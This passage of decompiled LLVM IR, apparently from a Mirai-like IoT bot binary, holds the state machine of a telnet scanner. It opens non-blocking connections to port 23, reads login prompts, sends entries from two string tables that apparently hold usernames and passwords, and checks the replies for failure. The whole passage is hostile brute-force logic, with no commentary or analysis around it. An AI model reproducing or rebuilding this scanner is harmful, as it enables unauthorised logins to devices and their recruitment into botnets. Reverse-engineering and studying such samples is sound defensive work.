dec_label_pc_b4a8:                                ; preds = %dec_label_pc_b390
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b4c8 = load i8, i8* %v2_b3b0, align 1
  %v4_b4c8 = zext i8 %v3_b4c8 to i32
  store i32 %v4_b4c8, i32* %r3.global-to-local, align 4
  %v2_b4cc = icmp eq i8 %v3_b4c8, 0
  br i1 %v2_b4cc, label %dec_label_pc_b4d4, label %dec_label_pc_b634

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b4a8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b4f8 = add i32 %v2_b2f4, 11
  %v2_b4f8 = inttoptr i32 %v1_b4f8 to i8*
  %v3_b4f8 = load i8, i8* %v2_b4f8, align 1
  %v1_b4fc = add i8 %v3_b4f8, 1
  store i8 %v1_b4fc, i8* %v2_b4f8, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b550 = add i32 %v2_b2f4, 10
  %v2_b550 = inttoptr i32 %v1_b550 to i8*
  %v3_b550 = load i8, i8* %v2_b550, align 2
  %v1_b554 = add i8 %v3_b550, 1
  store i32 %v3_b18c, i32* %ip.global-to-local, align 4
  store i8 %v1_b554, i8* %v2_b550, align 2
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b5a4 = load i8, i8* %v2_b4f8, align 1
  %v7_b5a8 = icmp eq i8 %v3_b5a4, 9
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v7_b5a8, label %dec_label_pc_b5b0, label %dec_label_pc_b5dc

dec_label_pc_b5b0:                                ; preds = %dec_label_pc_b4d4
  store i32 %v2_b3ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b3b0, align 1
  br label %dec_label_pc_c460

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b4d4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b5fc = load i8, i8* %v2_b550, align 2
  %v4_b5fc = zext i8 %v3_b5fc to i32
  store i32 %v4_b5fc, i32* %r3.global-to-local, align 4
  %v7_b600 = icmp eq i8 %v3_b5fc, 9
  br i1 %v7_b600, label %dec_label_pc_b608, label %dec_label_pc_b634

dec_label_pc_b608:                                ; preds = %dec_label_pc_b5dc
  store i32 %v2_b3ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b3b0, align 1
  br label %dec_label_pc_c460

dec_label_pc_b634:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b4a8, %dec_label_pc_b3bc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b648 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b690 = add i32 %v2_b68c, %v2_b2f0
  store i32 %v2_b690, i32* %r3.global-to-local, align 4
  %v1_b694 = inttoptr i32 %v2_b690 to i32*
  %v2_b694 = load i32, i32* %v1_b694, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_b6ac = call i32 @socket()
  %v0_b6b4 = load i32, i32* @r4, align 4
  %v2_b6c0 = mul i32 %v0_b6b4, 28
  %v2_b6c4 = add i32 %v2_b6c0, %v3_b18c
  %v2_b6c8 = inttoptr i32 %v2_b6c4 to i32*
  store i32 %v0_b6ac, i32* %v2_b6c8, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_b6e4 = inttoptr i32 %v2_b2f4 to i32*
  %v2_b6e4 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b6e4, i32* %r3.global-to-local, align 4
  %v7_b6e8 = icmp eq i32 %v2_b6e4, -1
  br i1 %v7_b6e8, label %dec_label_pc_c460, label %dec_label_pc_b6f0

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b634
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b708 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b708, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b724 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b724, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b734 = call i32 @__libc_fcntl(i32 %v2_b724, i32 3)
  %v1_b73c = or i32 %v2_b734, 2048
  store i32 %v1_b73c, i32* %r3.global-to-local, align 4
  %v0_b740 = load i32, i32* @r4, align 4
  store i32 %v1_b73c, i32* @r2, align 4
  %v2_b74c = call i32 @__libc_fcntl(i32 %v0_b740, i32 4)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b768 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b768, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_b77c = call i32 @__libc_connect(i32 %v2_b768, %sockaddr* nonnull %v3_b77c, i32 16)
  store i32 %v4_b77c, i32* %r3.global-to-local, align 4
  %v3_b784 = icmp eq i32 %v4_b77c, -1
  br i1 %v3_b784, label %dec_label_pc_b78c, label %dec_label_pc_b7c4

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b6f0
  %v0_b78c = call i32 @__errno_location()
  store i32 %v0_b78c, i32* %r3.global-to-local, align 4
  %v1_b794 = inttoptr i32 %v0_b78c to i32*
  %v2_b794 = load i32, i32* %v1_b794, align 4
  store i32 %v2_b794, i32* %r3.global-to-local, align 4
  %v7_b798 = icmp eq i32 %v2_b794, 115
  br i1 %v7_b798, label %dec_label_pc_b7c4, label %dec_label_pc_b7a0

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b78c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b7bc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b6f0, %dec_label_pc_b78c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b7e4 = call i32 @advance_state(i32* nonnull %v1_b6e4, i32 1)
  br label %dec_label_pc_c460

dec_label_pc_b800.lr.ph:                          ; preds = %dec_label_pc_b340
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b800

dec_label_pc_b800:                                ; preds = %dec_label_pc_b800.lr.ph, %dec_label_pc_b800
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b800.lr.ph ], [ %v1_b814, %dec_label_pc_b800 ]
  store i32 %v2_b7ec, i32* %r2.global-to-local, align 4
  %v5_b80c = mul nuw nsw i32 %storemerge610, 4
  %v6_b80c = add i32 %v5_b80c, %v2_b7ec
  %v7_b80c = inttoptr i32 %v6_b80c to i32*
  store i32 0, i32* %v7_b80c, align 4
  %v1_b814 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_b814, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_b814, 32
  br i1 %tmp43, label %dec_label_pc_b800, label %dec_label_pc_b828

dec_label_pc_b828:                                ; preds = %dec_label_pc_b800
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_b840 = inttoptr i32 %v2_b2f4 to i32*
  %v2_b840 = load i32, i32* %v1_b840, align 4
  %v3_b844 = udiv i32 %v2_b840, 32
  %v3_b858 = mul nuw nsw i32 %v3_b844, 4
  %v2_b860 = add i32 %v3_b858, %v19_b0a4
  store i32 %v2_b860, i32* %r2.global-to-local, align 4
  %v2_b864 = add i32 %v2_b860, -300
  store i32 %v2_b864, i32* %r3.global-to-local, align 4
  %v1_b868 = inttoptr i32 %v2_b864 to i32*
  %v2_b868 = load i32, i32* %v1_b868, align 4
  store i32 %v2_b868, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b884 = load i32, i32* %v1_b840, align 4
  %v1_b888 = urem i32 %v2_b884, 32
  %v6_b890 = shl i32 1, %v1_b888
  %v2_b894 = or i32 %v6_b890, %v2_b868
  store i32 %v2_b894, i32* %v1_b868, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b8dc = load i32, i32* %v1_b840, align 4
  %v1_b8e0 = add i32 %v2_b8dc, 1
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ec, i32* %ip.global-to-local, align 4
  %v1_b8ec = load i32, i32* @sp, align 4
  %v2_b8ec = inttoptr i32 %v1_b8ec to i32*
  store i32 %v2_b8e8, i32* %v2_b8ec, align 4
  %v0_b8f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_b900 = load i32, i32* %stack_var_-332, align 4
  %v5_b900 = call i32 @__libc_select(i32 %v0_b8f0, i32 0, i32 %v2_b7ec, i32 0, i32 %v4_b900)
  store i32 %v5_b900, i32* %r3.global-to-local, align 4
  %v7_b910 = icmp eq i32 %v5_b900, 1
  br i1 %v7_b910, label %dec_label_pc_b918, label %dec_label_pc_ba1c

dec_label_pc_b918:                                ; preds = %dec_label_pc_b828
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b940 = load i32, i32* %v1_b840, align 4
  store i32 %v2_b940, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %ip.global-to-local, align 4
  %v1_b94c = load i32, i32* @sp, align 4
  %v2_b94c = inttoptr i32 %v1_b94c to i32*
  store i32 %v2_b948, i32* %v2_b94c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %r3.global-to-local, align 4
  %v0_b960 = call i32 @getsockopt()
  %v3_b964 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_b964, i32* %r3.global-to-local, align 4
  %v2_b968 = icmp eq i32 %v3_b964, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  br i1 %v2_b968, label %dec_label_pc_b994, label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_b918
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b98c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_b994:                                ; preds = %dec_label_pc_b918
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b9ac = load i32, i32* %v1_b840, align 4
  store i32 %v2_b9ac, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b9c8 = load i32, i32* %v1_b840, align 4
  store i32 %v2_b9c8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b9d8 = call i32 @__libc_fcntl(i32 %v2_b9c8, i32 3)
  %v1_b9e0 = and i32 %v2_b9d8, -2049
  store i32 %v1_b9e0, i32* %r3.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v1_b9e0, i32* @r2, align 4
  %v2_b9f0 = call i32 @__libc_fcntl(i32 %v0_b9e4, i32 4)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_ba14 = call i32 @advance_state(i32* nonnull %v1_b840, i32 2)
  br label %dec_label_pc_c460

dec_label_pc_ba1c:                                ; preds = %dec_label_pc_b828
  store i32 %v5_b900, i32* %r3.global-to-local, align 4
  %v3_ba20 = icmp eq i32 %v5_b900, -1
  br i1 %v3_ba20, label %dec_label_pc_ba28, label %dec_label_pc_ba4c

dec_label_pc_ba28:                                ; preds = %dec_label_pc_ba1c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_ba44 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba1c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_ba68 = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_ba68, i32* %r3.global-to-local, align 4
  %v1_ba6c = inttoptr i32 %v2_ba68 to i32*
  %v2_ba6c = load i32, i32* %v1_ba6c, align 4
  store i32 %v2_ba6c, i32* %r3.global-to-local, align 4
  %v1_ba70 = add i32 %v2_ba6c, 5
  store i32 %v1_ba70, i32* @r4, align 4
  %v2_ba78 = call i32 @__GI_time(i32* null)
  store i32 %v2_ba78, i32* %r3.global-to-local, align 4
  %v0_ba80 = load i32, i32* @r4, align 4
  %v3_ba80 = icmp ult i32 %v0_ba80, %v2_ba78
  br i1 %v3_ba80, label %dec_label_pc_ba88, label %dec_label_pc_c460

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_baa4 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_baac:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bac4 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bac4 = load i32, i32* %v1_bac4, align 4
  store i32 %v2_bac4, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bae4 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_bae4, i32* %r3.global-to-local, align 4
  %v1_bae8 = inttoptr i32 %v2_bae4 to i32*
  %v2_bae8 = load i32, i32* %v1_bae8, align 4
  store i32 %v2_bae8, i32* %r2.global-to-local, align 4
  %v1_baf0 = load i32, i32* @sp, align 4
  %v2_baf0 = inttoptr i32 %v1_baf0 to i32*
  store i32 ptrtoint (i32* @global_var_2246c to i32), i32* %v2_baf0, align 4
  %v0_baf4 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bb00 = inttoptr i32 %v2_bae8 to i8*
  %v5_bb00 = call i32 @read_until_response(i32 %v0_baf4, i32 %arg1, i8* %v4_bb00, i32 1024)
  %v2_bb08 = icmp eq i32 %v5_bb00, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bb08, label %dec_label_pc_bb98, label %dec_label_pc_bb10

dec_label_pc_bb10:                                ; preds = %dec_label_pc_baac
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bb2c = add i32 %v2_b2f4, 24
  store i32 %v2_bb2c, i32* %r3.global-to-local, align 4
  %v1_bb30 = inttoptr i32 %v2_bb2c to i32*
  %v2_bb30 = load i32, i32* %v1_bb30, align 4
  store i32 %v2_bb30, i32* %r3.global-to-local, align 4
  %v1_bb38 = call i32 @contains_fail(i32 %v2_bb30)
  %v2_bb40 = icmp eq i32 %v1_bb38, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v2_bb40, label %dec_label_pc_bb70, label %dec_label_pc_bb48

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bb10
  %v3_bb68 = call i32 @advance_state(i32* %v1_bac4, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb10
  %v3_bb90 = call i32 @advance_state(i32* %v1_bac4, i32 3)
  br label %dec_label_pc_c460

dec_label_pc_bb98:                                ; preds = %dec_label_pc_baac
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v2_bbb8 = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_bbb8, i32* %r3.global-to-local, align 4
  %v1_bbbc = add i32 %v2_bbb8, 7
  store i32 %v1_bbbc, i32* @r4, align 4
  %v2_bbc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_bbc4, i32* %r3.global-to-local, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  %v3_bbcc = icmp ult i32 %v0_bbcc, %v2_bbc4
  br i1 %v3_bbcc, label %dec_label_pc_bbd4, label %dec_label_pc_c460

dec_label_pc_bbd4:                                ; preds = %dec_label_pc_bb98
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_bbf0 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bc10 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bc10 = load i32, i32* %v1_bc10, align 4
  store i32 %v2_bc10, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bc30 = add i32 %v2_b2f4, 8
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v1_bc34 = add i32 %v2_b2f4, 10
  %v2_bc34 = inttoptr i32 %v1_bc34 to i8*
  %v3_bc34 = load i8, i8* %v2_bc34, align 2
  %v4_bc34 = zext i8 %v3_bc34 to i32
  store i32 %v4_bc34, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32), i32* %r3.global-to-local, align 4
  %v4_bc40 = mul nuw nsw i32 %v4_bc34, 4
  %v5_bc40 = add i32 %v4_bc40, ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32)
  %v6_bc40 = inttoptr i32 %v5_bc40 to i32*
  %v7_bc40 = load i32, i32* %v6_bc40, align 4
  store i32 %v7_bc40, i32* @r5, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v3_bc64 = load i8, i8* %v2_bc34, align 2
  %v4_bc64 = zext i8 %v3_bc64 to i32
  store i32 %v4_bc64, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32), i32* %r3.global-to-local, align 4
  %v4_bc70 = mul nuw nsw i32 %v4_bc64, 4
  %v5_bc70 = add i32 %v4_bc70, ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32)
  %v6_bc70 = inttoptr i32 %v5_bc70 to i32*
  %v7_bc70 = load i32, i32* %v6_bc70, align 4
  store i32 %v7_bc70, i32* %r3.global-to-local, align 4
  %v1_bc74 = inttoptr i32 %v7_bc70 to i8*
  %v3_bc78 = call i32 @strlen(i8* %v1_bc74)
  %v0_bc80 = load i32, i32* @r4, align 4
  %v0_bc84 = load i32, i32* @r5, align 4
  store i32 %v3_bc78, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bc90 = inttoptr i32 %v0_bc84 to i32*
  %v5_bc90 = call i32 @__libc_send(i32 %v0_bc80, i32* %v4_bc90, i32 %v3_bc78, i32 16384)
  %v1_bc98 = icmp slt i32 %v5_bc90, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bc98, label %dec_label_pc_bca0, label %dec_label_pc_bcc4

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bbf8
  %v3_bcbc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bcc4:                                ; preds = %dec_label_pc_bbf8
  %v2_bcdc = load i32, i32* %v1_bc10, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bcf0 = call i32 @__libc_send(i32 %v2_bcdc, i32* bitcast ([3 x i8]* @global_var_18860.109 to i32*), i32 2, i32 16384)
  %v1_bcf8 = icmp slt i32 %v6_bcf0, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bcf8, label %dec_label_pc_bd00, label %dec_label_pc_bd24

dec_label_pc_bd00:                                ; preds = %dec_label_pc_bcc4
  %v3_bd1c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcc4
  %v3_bd44 = call i32 @advance_state(i32* nonnull %v1_bc10, i32 4)
  br label %dec_label_pc_c460

dec_label_pc_bd4c:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bd64 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bd64 = load i32, i32* %v1_bd64, align 4
  store i32 %v2_bd64, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bd84 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_bd84, i32* %r3.global-to-local, align 4
  %v1_bd88 = inttoptr i32 %v2_bd84 to i32*
  %v2_bd88 = load i32, i32* %v1_bd88, align 4
  store i32 %v2_bd88, i32* %r2.global-to-local, align 4
  %v1_bd90 = load i32, i32* @sp, align 4
  %v2_bd90 = inttoptr i32 %v1_bd90 to i32*
  store i32 ptrtoint (i32* @global_var_2246c to i32), i32* %v2_bd90, align 4
  %v0_bd94 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bda0 = inttoptr i32 %v2_bd88 to i8*
  %v5_bda0 = call i32 @read_until_response(i32 %v0_bd94, i32 %arg1, i8* %v4_bda0, i32 1024)
  %v2_bda8 = icmp eq i32 %v5_bda0, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bda8, label %dec_label_pc_be38, label %dec_label_pc_bdb0

dec_label_pc_bdb0:                                ; preds = %dec_label_pc_bd4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bdcc = add i32 %v2_b2f4, 24
  store i32 %v2_bdcc, i32* %r3.global-to-local, align 4
  %v1_bdd0 = inttoptr i32 %v2_bdcc to i32*
  %v2_bdd0 = load i32, i32* %v1_bdd0, align 4
  store i32 %v2_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd8 = call i32 @contains_fail(i32 %v2_bdd0)
  %v2_bde0 = icmp eq i32 %v1_bdd8, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v2_bde0, label %dec_label_pc_be10, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdb0
  %v3_be08 = call i32 @advance_state(i32* %v1_bd64, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_be10:                                ; preds = %dec_label_pc_bdb0
  %v3_be30 = call i32 @advance_state(i32* %v1_bd64, i32 5)
  br label %dec_label_pc_c460

dec_label_pc_be38:                                ; preds = %dec_label_pc_bd4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v2_be58 = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_be58, i32* %r3.global-to-local, align 4
  %v1_be5c = add i32 %v2_be58, 3
  store i32 %v1_be5c, i32* @r4, align 4
  %v2_be64 = call i32 @__GI_time(i32* null)
  store i32 %v2_be64, i32* %r3.global-to-local, align 4
  %v0_be6c = load i32, i32* @r4, align 4
  %v3_be6c = icmp ult i32 %v0_be6c, %v2_be64
  br i1 %v3_be6c, label %dec_label_pc_be74, label %dec_label_pc_c460

dec_label_pc_be74:                                ; preds = %dec_label_pc_be38
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_be90 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_be98:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_beb0 = inttoptr i32 %v2_b2f4 to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  store i32 %v2_beb0, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bed0 = add i32 %v2_b2f4, 8
  store i32 %v2_bed0, i32* %r3.global-to-local, align 4
  %v1_bed4 = add i32 %v2_b2f4, 11
  %v2_bed4 = inttoptr i32 %v1_bed4 to i8*
  %v3_bed4 = load i8, i8* %v2_bed4, align 1
  %v4_bed4 = zext i8 %v3_bed4 to i32
  store i32 %v4_bed4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_22418.111 to i32), i32* %r3.global-to-local, align 4
  %v4_bee0 = mul nuw nsw i32 %v4_bed4, 4
  %v5_bee0 = add i32 %v4_bee0, ptrtoint ([9 x i8*]* @global_var_22418.111 to i32)
  %v6_bee0 = inttoptr i32 %v5_bee0 to i32*
  %v7_bee0 = load i32, i32* %v6_bee0, align 4
  store i32 %v7_bee0, i32* @r5, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_bed0, i32* %r3.global-to-local, align 4
  %v3_bf04 = load i8, i8* %v2_bed4, align 1
  %v4_bf04 = zext i8 %v3_bf04 to i32
  store i32 %v4_bf04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_22418.111 to i32), i32* %r3.global-to-local, align 4
  %v4_bf10 = mul nuw nsw i32 %v4_bf04, 4
  %v5_bf10 = add i32 %v4_bf10, ptrtoint ([9 x i8*]* @global_var_22418.111 to i32)
  %v6_bf10 = inttoptr i32 %v5_bf10 to i32*
  %v7_bf10 = load i32, i32* %v6_bf10, align 4
  store i32 %v7_bf10, i32* %r3.global-to-local, align 4
  %v1_bf14 = inttoptr i32 %v7_bf10 to i8*
  %v3_bf18 = call i32 @strlen(i8* %v1_bf14)
  %v0_bf20 = load i32, i32* @r4, align 4
  %v0_bf24 = load i32, i32* @r5, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bf30 = inttoptr i32 %v0_bf24 to i32*
  %v5_bf30 = call i32 @__libc_send(i32 %v0_bf20, i32* %v4_bf30, i32 %v3_bf18, i32 16384)
  %v1_bf38 = icmp slt i32 %v5_bf30, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bf38, label %dec_label_pc_bf40, label %dec_label_pc_bf64

dec_label_pc_bf40:                                ; preds = %dec_label_pc_be98
  %v3_bf5c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bf64:                                ; preds = %dec_label_pc_be98
  %v2_bf7c = load i32, i32* %v1_beb0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bf90 = call i32 @__libc_send(i32 %v2_bf7c, i32* bitcast ([3 x i8]* @global_var_18860.109 to i32*), i32 2, i32 16384)
  %v1_bf98 = icmp slt i32 %v6_bf90, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc4

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf64
  %v3_bfbc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bf64
  %v3_bfe4 = call i32 @advance_state(i32* nonnull %v1_beb0, i32 6)
  br label %dec_label_pc_c460

dec_label_pc_bfec:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
